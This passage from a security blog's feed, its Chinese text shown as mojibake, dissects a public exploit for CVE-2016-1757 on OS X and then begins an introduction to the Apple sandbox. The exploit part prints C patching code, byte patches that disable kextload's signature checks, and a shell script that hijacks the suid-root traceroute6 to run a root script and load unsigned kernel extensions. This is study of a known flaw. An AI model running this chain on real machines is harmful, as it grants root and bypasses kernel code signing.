class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// at what offset (rounded down to a page boundary) from the start of the mapping in the target should we write?</span></span><br><span class="line"><span class="keyword">size_t</span> target_patch_start_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// how much should we write (rounded up to a page boundary)</span></span><br><span class="line"><span class="keyword">size_t</span> target_patch_write_length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pointer to the replacement bytes to overwrite with</span></span><br><span class="line"><span class="keyword">char</span>* replacement_bytes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* apply the patch, recording the lowest and highest addresses we touch */</span></span><br><span class="line"><span class="comment">// original is page-aligned</span></span><br><span class="line"><span class="comment">// å¯¹originalæ–‡ä»¶è¿›è¡Œpatch</span></span><br><span class="line"><span class="comment">// è¿™ä¸ªpatchçš„å‡½æ•°åªæ˜¯ä¸ºäº†å¯¹kextloadè¿›è¡Œpatchï¼Œå…³é—­å¯¹æœªç­¾åå†…æ ¸æ‰©å±•çš„éªŒè¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* kextload_disable_signature_checks</span><br><span class="line"> * 0000000000000000  C9 20 00 00 03 00 00 00  31 C0 C3 94 27 00 00 05  . ......1...'...</span><br><span class="line"> * 0000000000000010  00 00 00 90 90 90 31 C0  0D 28 00 00 05 00 00 00  ......1..(......</span><br><span class="line"> * 0000000000000020  90 90 90 31 C0                                    ...1.</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç†è®ºä¸Špatch_length = 0x1000,å› ä¸ºlengthç»è¿‡roundupçš„å¤„ç†ã€‚</span></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">apply_patch</span><span class="params">(<span class="keyword">char</span>* original, size_t original_length, <span class="keyword">char</span>* patch, size_t patch_length)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// patch format is:</span></span><br><span class="line">  <span class="comment">// u32 offset</span></span><br><span class="line">  <span class="comment">// u32 length</span></span><br><span class="line">  <span class="comment">// u8 * length bytes to be written</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//è¿™ä¸¤ä¸ªå­—æ®µç”¨æ¥è®¡ç®—å†…å­˜ä¸­éœ€è¦ä¿å­˜çš„æ•°æ®çš„å¼€å§‹ä½ç½®å’Œè§£é‡Šä½ç½®</span></span><br><span class="line">  <span class="keyword">char</span>* lowest = (<span class="keyword">char</span>*)UINTPTR_MAX; </span><br><span class="line">  <span class="keyword">char</span>* highest = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> remaining = patch_length;</span><br><span class="line">  <span class="keyword">while</span> (remaining &gt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset = *(<span class="keyword">uint32_t</span>*)patch;</span><br><span class="line">    <span class="keyword">uint32_t</span> length = *(<span class="keyword">uint32_t</span>*)(patch+<span class="number">4</span>);</span><br><span class="line">    remaining -= <span class="number">8</span>;</span><br><span class="line">    patch += <span class="number">8</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/*</span><br><span class="line">    	ä»¥kextload_disable_signature_checksä¸ºä¾‹</span><br><span class="line">    	0x000020c9å¤„å¼€å§‹0x00000003ä¸ªå­—èŠ‚æ”¹å†™ä¸º0x31 0xc0 0xc3</span><br><span class="line">    	0x00002794å¤„å¼€å§‹0x00000005ä¸ªå­—èŠ‚æ”¹å†™ä¸º0x90 0x90 0x90 0x31 0xc0</span><br><span class="line">    	0x0000280Då¤„å¼€å§‹0x00000005ä¸ªå­—èŠ‚æ”¹å†™ä¸º0x90 0x90 0x90 0x31 0xc0</span><br><span class="line">    */</span></span><br><span class="line">    </span><br><span class="line">   	<span class="comment">/* é”™è¯¯å¤„ç†*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// record if we're extending the boundaries of touched pages</span></span><br><span class="line">    <span class="comment">// æ ¹æ®patchçš„åœ°å€é‡æ–°è®¡ç®—ä¸¤ä¸ªå˜é‡å€¼</span></span><br><span class="line">    <span class="keyword">if</span> ((original+offset) &lt; lowest) &#123;</span><br><span class="line">      lowest = original+offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((original+offset+length) &gt; highest) &#123;</span><br><span class="line">      highest = original+offset+length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// apply the patch</span></span><br><span class="line">    <span class="built_in">memcpy</span>(original+offset, patch, length);</span><br><span class="line">    remaining -= length;</span><br><span class="line">    patch += length;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//éœ€è¦æ”¹å†™åˆ°ç›®æ ‡è¿›ç¨‹çš„æ•°æ®çš„èµ·å§‹</span></span><br><span class="line">  replacement_bytes = ptr_rounddown(lowest);</span><br><span class="line">  <span class="comment">//æ”¹å†™å†…å®¹åœ¨ç›®æ ‡è¿›ç¨‹ä¸­çš„èµ·å§‹ä½ç½®</span></span><br><span class="line">  target_patch_start_offset = replacement_bytes - original;</span><br><span class="line">  <span class="comment">//éœ€è¦æ”¹å†™çš„å†…å®¹çš„é•¿åº¦</span></span><br><span class="line">  target_patch_write_length = ptr_roundup(highest) - replacement_bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»“åˆå¯¹<code>port</code>çš„åˆ©ç”¨ï¼Œæµç¨‹å¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/patch.png" alt="patch"></p>
<p>æ‰€ä»¥<code>executer</code>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæŠ½è±¡çš„å·¥å…·ï¼Œè¯¥å·¥å…·çš„ä½œç”¨å°±æ˜¯é€šè¿‡<code>binpatch</code>æ–‡ä»¶çš„å†…å®¹ï¼Œå¯¹ç›®æ ‡ç¨‹åºè¿›è¡Œ<code>patch</code>å¹¶æ‰§è¡Œã€‚</p>
<h2 id="2-2_é€šè¿‡Patchç»•è¿‡åŠ è½½é©±åŠ¨å¯¹ç­¾åçš„è¦æ±‚">2.2 é€šè¿‡Patchç»•è¿‡åŠ è½½é©±åŠ¨å¯¹ç­¾åçš„è¦æ±‚</h2><p>æ•´ä¸ªbindiffçš„æ¯”è¾ƒï¼Œä»¥åŠæºç ä½ç½®å¯ä»¥å‚ç…§ä¹‹å‰çš„è¿™ç¯‡æ–‡ç« ã€‚<a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">åˆ©ç”¨patchç»•è¿‡kextloadå¯¹å†…æ ¸ç­¾åçš„æ£€æµ‹</a>ã€‚</p>
<p>è¿™é‡Œè¯´ä¸€ä¸‹å‡ ä¸ªè¢«<code>patch</code>æ‰çš„å‡½æ•°çš„å…³ç³»ã€‚</p>
<table>
<thead>
<tr>
<th>patchç‚¹</th>
<th>è¡Œä¸º</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x000020c9</td>
<td>æ•´ä¸ªå‡½æ•°å†…å®¹å˜ä¸ºreturn 0ï¼›</td>
<td>ä½¿å¾—åŠ è½½æ‰©å±•æ—¶çš„æƒé™æ£€æµ‹éƒ½è¿”å›æˆåŠŸ</td>
</tr>
<tr>
<td>0x00002794</td>
<td>ç»•è¿‡å¯¹sub_0979å‡½æ•°çš„è°ƒç”¨</td>
<td>sub_0979ä¼šè°ƒç”¨ç­¾ååˆæ³•çš„æ£€æµ‹</td>
</tr>
<tr>
<td>0x0000280d</td>
<td>ç»•è¿‡å¯¹sub_085cå‡½æ•°çš„è°ƒç”¨</td>
<td>sub_085cä¼šè°ƒç”¨sub_0979</td>
</tr>
</tbody>
</table>
<h2 id="2-3_load_kext-sh">2.3 load_kext.sh</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># loading an unsigned kext is a two step process - first we need root</span><br><span class="line"># then we need to get the com.apple.rootless.kext-management entitlement</span><br><span class="line"></span><br><span class="line"># so let's build a simple shellscript to run as root:</span><br><span class="line"></span><br><span class="line"># åŠ è½½ä¸€ä¸ªæ²¡æœ‰ç­¾åçš„é©±åŠ¨ç¨‹åº</span><br><span class="line"># 1.rootæƒé™</span><br><span class="line"># 2.è·å–com.apple.rootless.kext-managementæƒé™</span><br><span class="line"></span><br><span class="line">if [ -z $1 ]</span><br><span class="line">then</span><br><span class="line">  echo 'usage: ./load_kext.sh &lt;path/to/kext&gt;'</span><br><span class="line">  exit $E_MISSING_POS_PARAM</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># we have a binary patch for the 10.11.3 version of kextload (which has the kext-management entitlement)</span><br><span class="line"># so lets build a script we can exec as root to apply that patch and load our kext</span><br><span class="line"></span><br><span class="line"># é€šè¿‡patchå¯ä»¥ä½¿å¾—kextloadæ‹¥æœ‰æƒé™</span><br><span class="line"></span><br><span class="line"># first, we need a thin'ed version of kextload</span><br><span class="line"># ä»fatæ ¼å¼ä¸­æå–x86_64çš„machoæ–‡ä»¶</span><br><span class="line">lipo -thin x86_64 -output kextload_64 `which kextload`</span><br><span class="line"></span><br><span class="line"># ç”Ÿæˆpatch kextloadå¹¶åŠ è½½å†…æ ¸æ‰©å±•çš„è„šæœ¬</span><br><span class="line">echo '#!/bin/zsh' &gt; kext_loading_helper.sh</span><br><span class="line">echo "# run me as root to load: $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">echo "/usr/sbin/chown -R root:wheel $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">echo "./executer -p kextload_disable_signature_checks.binpatch -o kextload_64 -- `which kextload` $1" &gt;&gt; kext_loading_helper.sh</span><br><span class="line">chmod +x kext_loading_helper.sh</span><br><span class="line"></span><br><span class="line"># build a binary patch to apply to traceroute6 (a suid-root binary, any will do though*) which overwrites</span><br><span class="line"># its entrypoint with shellcode to exec the script we just wrote (note that its a zsh script so will maintain euid 0)</span><br><span class="line"># æ ¹æ®pythonè„šæœ¬ç”Ÿæˆå¯¹traceroute6è¿›è¡Œpatchçš„binpatchæ–‡ä»¶</span><br><span class="line"># ç›®æ ‡æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´åœ¨rootæƒé™ä¸‹æ‰§è¡Œä¸Šé¢ç”Ÿæˆçš„kext_loading_helper.shè„šæœ¬</span><br><span class="line">python build_exec_patch.py `which traceroute6` `pwd`/kext_loading_helper.sh traceroute6_exec_kextloader.binpatch</span><br><span class="line"></span><br><span class="line"># use the exploit to apply that patch at exec time to the suid-root binary</span><br><span class="line"># åˆ©ç”¨åˆšåˆšç”Ÿæˆçš„binpatchæ‰§è¡Œtraceroute6</span><br><span class="line">./executer -p traceroute6_exec_kextloader.binpatch -o `which traceroute6` -- `which traceroute6` -invalid</span><br><span class="line"></span><br><span class="line"># cleanup</span><br><span class="line">rm -rf kextload_64 kext_loading_helper.sh traceroute6_exec_kextloader.binpatch</span><br><span class="line"></span><br><span class="line"># * if you choose a fat binary pass a lipo'ed thin version to -o</span><br><span class="line"># so lets build a script we can exec as root to apply that patch and load our kext:</span><br></pre></td></tr></table></figure>
<p>æ•´ä½“çš„æ‰§è¡Œæµç¨‹å¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤º:</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/kextload.png" alt="kextload"></p>
<h1 id="0x03_å°ç»“">0x03 å°ç»“</h1><p>è‡³æ­¤<code>CVE-2016-1757</code>çš„åˆ†æå‘Šä¸€æ®µè½ï¼Œç»“åˆ<code>POC</code>çš„åˆ†ææœ‰å‡ ä¸ªçŸ¥è¯†éœ€è¦å·©å›ºä¸æ€è€ƒã€‚</p>
<ul>
<li><code>PORT</code>çš„ä½¿ç”¨ã€‚</li>
<li><code>exec</code>çš„æµç¨‹ã€‚</li>
<li>å†…å­˜<code>patch</code>åœ¨æ¼æ´åˆ©ç”¨æ—¶çš„ç”¨æ³•ã€‚</li>
<li>åœ¨<code>exec</code>çš„å¯åŠ¨æµç¨‹ä¸­ï¼Œæ ¹æ®æ–°æ—§å†…å­˜å¯¹è±¡æ›¿æ¢çš„æ—¶æœºæ¯”è¾ƒç¨³å®šçš„æ‰¾åˆ°æ—¶é—´çª—å£ã€‚</li>
</ul>
<p>æ¼æ´çš„æˆå› ä¸ªäººæ€»ç»“ä¸º2ç‚¹ï¼š</p>
<ul>
<li>è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æƒé™ä¼šå¾—åˆ°æé«˜</li>
<li>è¿›ç¨‹åœ¨æ‰§è¡Œçš„æµç¨‹å­˜åœ¨è¢«<code>patch</code>çš„æœºä¼š</li>
</ul>
<h1 id="å¼•ç”¨">å¼•ç”¨</h1><p>1.<a href="http://googleprojectzero.blogspot.com/2016/03/race-you-to-kernel.html" target="_blank" rel="external">Race you to the kernel!</a></p>
<p>2.<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;redir=1" target="_blank" rel="external">Logic error when exec-ing suid binaries allows code execution as root on OS X/iOS</a></p>
<h1 id="PS">PS</h1><p>è¿™æ˜¯æˆ‘çš„å­¦ä¹ åˆ†äº«åšå®¢<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>æ¬¢è¿å¤§å®¶æ¥æ¢è®¨ï¼Œä¸è¶³ä¹‹å¤„è¿˜è¯·æŒ‡æ­£ã€‚</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0X00_æ‘˜è¦">0X00  æ‘˜è¦</h1><p>é€šè¿‡å¯¹<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>çš„<code>POC</code>è¿›è¡Œåˆ†æï¼Œå·²ç»å®Œå…¨äº†è§£äº†è¿™ä¸ªè¿™ä¸ªæ¼æ´çš„æˆå› ï¼Œè¿™é‡Œå¸¦æ¥å…¶ä¸€ä¸ª<code>Exploit</code>çš„åˆ†æã€‚</p>
<p>ç›¸å…³çš„<code>poc</code>å¯ä»¥åˆ°æˆ‘çš„<code>github</code>ä¸Šé¢è·å–</p>
<p><a href="https://github.com/turingH/exploit">https://github.com/turingH/exploit</a></p>
<p>æˆ–è€…ç›´æ¥åœ¨<code>google</code>çš„<code>project zero</code>ä¸­ä¸‹è½½ã€‚</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id">https://bugs.chromium.org/p/project-zero/issues/detail?id=676&amp;can=1&amp;q=OS%20X&amp;sort=-id</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
    
      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
    
      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[appleæ²™ç›’ç ”ç©¶ä¹‹åŸºç¡€çŸ¥è¯†]]></title>
    <link href="http://turingh.github.io/2016/04/18/apple%E6%B2%99%E7%9B%92%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://turingh.github.io/2016/04/18/appleæ²™ç›’ç ”ç©¶ä¹‹åŸºç¡€çŸ¥è¯†/</id>
    <published>2016-04-18T15:12:47.000Z</published>
    <updated>2016-04-19T18:52:38.000Z</updated>
    <content type="html"><![CDATA[<h1 id="1_åŸºç¡€çŸ¥è¯†">1 åŸºç¡€çŸ¥è¯†</h1><h1 id="1-1_ä»€ä¹ˆæ˜¯æ²™ç›’ï¼Ÿ">1.1 ä»€ä¹ˆæ˜¯æ²™ç›’ï¼Ÿ</h1><blockquote>
<p>åœ¨<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8" target="_blank" rel="external">è®¡ç®—æœºå®‰å…¨</a>é¢†åŸŸï¼Œ<strong>æ²™ç›’</strong>ï¼ˆè‹±è¯­ï¼šsandboxï¼Œåˆè¯‘ä¸º<strong>æ²™ç®±</strong>ï¼‰æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œä¸ºè¿è¡Œä¸­çš„ç¨‹åºæä¾›çš„éš”ç¦»ç¯å¢ƒã€‚é€šå¸¸æ˜¯ä½œä¸ºä¸€äº›æ¥æºä¸å¯ä¿¡ã€å…·ç ´ååŠ›æˆ–æ— æ³•åˆ¤å®šç¨‹åºæ„å›¾çš„ç¨‹åºæä¾›å®éªŒä¹‹ç”¨<a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8" target="_blank" rel="external">[1]</a>#cite_note-1)ã€‚</p>
<p>æ²™ç›’é€šå¸¸ä¸¥æ ¼æ§åˆ¶å…¶ä¸­çš„ç¨‹åºæ‰€èƒ½è®¿é—®çš„èµ„æºï¼Œæ¯”å¦‚ï¼Œæ²™ç›’å¯ä»¥æä¾›<a href="https://zh.wikipedia.org/wiki/%E5%A1%97%E9%8A%B7%E7%A9%BA%E9%96%93" target="_blank" rel="external">ç”¨åå³å›æ”¶</a>çš„ç£ç›˜åŠå†…å­˜ç©ºé—´ã€‚åœ¨æ²™ç›’ä¸­ï¼Œç½‘ç»œè®¿é—®ã€å¯¹çœŸå®ç³»ç»Ÿçš„è®¿é—®ã€å¯¹è¾“å…¥è®¾å¤‡çš„è¯»å–é€šå¸¸è¢«ç¦æ­¢æˆ–æ˜¯ä¸¥æ ¼é™åˆ¶ã€‚ä»è¿™ä¸ªè§’åº¦æ¥è¯´ï¼Œæ²™ç›’å±äº<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%8C%96" target="_blank" rel="external">è™šæ‹ŸåŒ–</a>çš„ä¸€ç§ã€‚</p>
<p>æ²™ç›’ä¸­çš„æ‰€æœ‰æ”¹åŠ¨å¯¹<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" target="_blank" rel="external">æ“ä½œç³»ç»Ÿ</a>ä¸ä¼šé€ æˆä»»ä½•æŸå¤±ã€‚é€šå¸¸ï¼Œè¿™ç§æŠ€æœ¯è¢«<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA" target="_blank" rel="external">è®¡ç®—æœº</a>æŠ€æœ¯äººå‘˜å¹¿æ³›ç”¨äºæµ‹è¯•å¯èƒ½<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92" target="_blank" rel="external">å¸¦æ¯’</a>çš„ç¨‹åºæˆ–æ˜¯å…¶ä»–çš„<a href="https://zh.wikipedia.org/wiki/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6" target="_blank" rel="external">æ¶æ„ä»£ç </a><a href="https://zh.wikipedia.org/wiki/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8" target="_blank" rel="external">[2]</a>#cite_note-2)ã€‚</p>
<p>â€” ç»´åŸºç™¾ç§‘,æ²™ç›’ (è®¡ç®—æœºå®‰å…¨)</p>
</blockquote>
<p>è¿™æ ·ä¸€æ®µè¯è¯´çš„å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œå…³äºåœ¨<code>OS X</code>ç³»ç»Ÿä¸­æ²™ç›’çš„ç®€å•åº”ç”¨ï¼Œä¹Ÿæœ‰æ–‡ç« è§£é‡Šè¿‡äº†ï¼Œè¿™äº›ä¸æ˜¯æœ¬æ–‡çš„æ ¸å¿ƒå†…å®¹ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡Œ<code>google</code>ã€‚</p>
<p>åœ¨<code>OS X</code>ä»¥åŠ<code>IOS</code>ç³»ç»Ÿä¸­é™åˆ¶äº†è¿›ç¨‹å¯¹ä¸€äº›èµ„æºçš„è®¿é—®æƒé™ï¼Œä¾‹å¦‚ç½‘ç»œã€æŸäº›ç‰¹æ®Šè·¯å¾„ã€æ–‡ä»¶çš„è¯»å†™ç­‰ç­‰ï¼Œé™å®šäº†è¿›ç¨‹çš„ä¸€äº›è¡Œä¸ºï¼Œä»è€Œä¿è¯è¿›ç¨‹ä¸ä¼šåšå‡ºè¶…è¶Šæƒé™çš„æ“ä½œã€‚</p>
<a id="more"></a>
<p>æ²™ç›’å¬ä¸Šå»çš„æ„Ÿè§‰æ˜¯ä¸€ä¸ªè¿›ç¨‹åœ¨ä¸€ä¸ªæœ‰ä¿æŠ¤çš„ç¯å¢ƒä¸­æ‰§è¡Œï¼Œä¸ä¼šåšå‡ºè§„å®šèŒƒå›´å†…ä¸å…è®¸çš„äº‹æƒ…ï¼Œç»™äººçš„æ„Ÿè§‰å¯èƒ½æ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_feels_like.png.png" alt="æ²™ç›’"></p>
<p>è¿™æ ·çš„ç†è§£å¯¹åº”ç”¨å¼€å‘æ¥è¯´å·²ç»å¤Ÿç”¨äº†ï¼Œé€šè¿‡ç†è§£æ²™ç›’çš„å†…éƒ¨å®ç°ï¼Œå‘ç°æ²™ç›’çš„å®è´¨å…¶å®æ›´åƒæ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_really.png" alt="æ²™ç›’"></p>
<p>è€Œåœ¨<code>OS X</code>ä¸­æ²™ç›’ä¹Ÿè¢«ç§°ä½œ<code>seatbelt</code>ã€‚<code>APP</code>çš„ä¸€ä¸¾ä¸€åŠ¨éƒ½è¢«<code>TrustedBSD</code>çš„<code>HOOK</code>ç»„ä»¶ç›‘æ§ï¼Œæ ¹æ®æ²™ç›’ä½¿ç”¨çš„<code>profile</code>ä¸­çš„é…ç½®åšå‡ºç›¸åº”çš„å¤„ç†ã€‚</p>
<p>ä¸‹é¢ å°±é€šè¿‡ç®€å•çš„åˆ†ææ²™ç›’çš„å·¥ä½œæµç¨‹ï¼Œè¯¦ç»†äº†è§£æ²™ç›’çš„å·¥ä½œåŸç†ã€‚</p>
<h2 id="1-2_æ²™ç›’å·¥ä½œæµç¨‹ä¸ç›¸å…³ç³»ç»Ÿç»„ä»¶">1.2 æ²™ç›’å·¥ä½œæµç¨‹ä¸ç›¸å…³ç³»ç»Ÿç»„ä»¶</h2><p>æ²™ç›’çš„å¤§è‡´å·¥ä½œæµç¨‹å…¥ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_workflow.png" alt="sandbox_workflow"></p>
<ul>
<li><code>1</code>è¿›ç¨‹å°è¯•è¿›è¡Œä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ï¼Œè°ƒç”¨å†…æ ¸åŠŸèƒ½ã€‚</li>
<li><code>2ã€3</code>MACå±‚éœ€è¦æ ¹æ®è¯¥è¿›ç¨‹çš„å®‰å…¨ç­–ç•¥åˆ¤æ–­æ­¤æ¬¡ç³»ç»Ÿè°ƒç”¨æ˜¯å¦å¯ä»¥æ‰§è¡Œã€‚</li>
<li><code>4ã€5ã€6ã€7ã€8ã€9</code>å¦‚æœå­˜åœ¨ç­–ç•¥çš„è¯ï¼Œé€šè¿‡<code>sandbox.kext</code>ï¼ˆhookå‡½æ•°ï¼‰å’Œ<code>AppleMatch.kext</code>ï¼ˆæ²™ç›’çš„profileè§£æï¼‰ä¸¤ä¸ªå†…æ ¸æ‰©å±•å®ç°æƒé™çš„æ£€æŸ¥ã€‚</li>
<li><code>10</code>è¿”å›è°ƒç”¨ç»“æœ</li>
</ul>
<p>ä¸æ²™ç›’ç³»ç»Ÿç›¸å…³çš„æ¨¡å—å¤§è‡´å¦‚ä¸‹ï¼š</p>
<ul>
<li>libSystem.dylib: æä¾›<code>sandbox_init</code>ã€<code>sandbox_free_error</code>ç­‰å‡½æ•°ã€‚</li>
<li>libSandbox.dylib: æä¾›è§£æï¼Œç¼–è¯‘ï¼Œç”Ÿæˆ<code>*.sb</code>çš„æ²™ç›’<code>profile</code>çš„å‡½æ•°ã€‚</li>
<li>sandbox.kextï¼šæä¾›äº†system callçš„hookå‡½æ•°</li>
<li>AppleMatch.kextï¼šæä¾›äº†è§£æ<code>profile</code>çš„å‡½æ•°</li>
</ul>
<p>ç»“æ„å›¾å¤§è‡´å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/apple_sandbox/sandbox_birdview.png" alt="ç»“æ„å›¾"></p>
<h1 id="1-3_å°ç»“">1.3 å°ç»“</h1><p>â€‹    æ²™ç›’çš„å·¥ä½œæµç¨‹å¤§è‡´å¯ä»¥æ€»ç»“ä¸ºï¼š</p>
<ol>
<li><p>é€šè¿‡<code>sandbox_init</code>åˆå§‹åŒ–æŸæ²™ç›’ç­–ç•¥è„šæœ¬å¹¶ç¼–è¯‘ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶</p>
</li>
<li><p>åœ¨è¿›ç¨‹è¿›è¡Œ<code>system call</code>æ—¶ï¼Œé€šè¿‡<code>TrustedBSD</code>æä¾›çš„<code>hook</code>æ¨¡å—ï¼Œåˆ©ç”¨<code>Sandbox.kext</code>æä¾›çš„<code>system call hook</code>å‡½æ•°ï¼Œç»“åˆæ²™ç›’ç­–ç•¥è¿›è¡Œåˆ¤æ–­ï¼Œè¯¥è¿›ç¨‹æ˜¯å¦æœ‰æƒé™æ‰§è¡Œè¯¥<code>system call</code>ã€‚</p>
</li>
</ol>
<p>   é€šè¿‡å¯¹è¿™äº›åŸºç¡€çŸ¥è¯†çš„äº†è§£ï¼Œå¯ä»¥è¿›å…¥å¯¹æ²™ç›’çš„è¿›ä¸€æ­¥ç ”ç©¶äº†ï¼Œåœ¨ä¸‹ä¸€ç« é€šè¿‡é€†å‘ä»¥åŠéƒ¨åˆ†æºç ï¼Œä»ä»£ç å®ç°çš„å±‚é¢è¿›è¡Œæ›´æ·±ä¸€å±‚æ¬¡çš„åˆ†æã€‚</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="1_åŸºç¡€çŸ¥è¯†">1 åŸºç¡€çŸ¥è¯†</h1><h1 id="1-1_ä»€ä¹ˆæ˜¯æ²™ç›’ï¼Ÿ">1.1 ä»€ä¹ˆæ˜¯æ²™ç›’ï¼Ÿ</h1><blockquote>
